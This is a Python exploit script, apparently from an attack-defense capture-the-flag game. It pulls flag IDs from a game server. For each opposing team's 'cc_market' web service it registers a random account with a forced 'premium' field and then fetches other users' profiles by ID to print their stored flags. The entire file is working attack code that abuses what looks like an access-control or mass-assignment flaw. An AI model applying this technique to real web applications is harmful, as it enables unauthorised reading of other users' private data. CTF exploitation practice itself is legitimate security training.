#!/usr/bin/env python3
import requests
import json
import sys
import random
import string
from pwn import *

def generate(ln=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(ln))

addr = sys.argv[1]


# CHANGE THIS -v
PORT = 1337
SERVICE = 'cc_market'

URL = 'http://' + addr + ':' + str(PORT)
FLAGID_URL = 'http://10.10.0.1:8081/flagIds?service={}&team={}'.format(SERVICE, addr)
flag_ids = json.loads(requests.get(FLAGID_URL).text)
flag_ids = flag_ids[SERVICE][addr]


for flag_id in flag_ids:

    s = requests.Session()
    usr = generate()
    psw = generate()
    a = s.post(URL + '/register', data={'username': usr, 'password': psw, 'secret': 'suca', 'category': 'osint', 'premium': '1'})

    a = s.get(URL + '/profile/' + flag_id)
    print(a.text, flush=True)

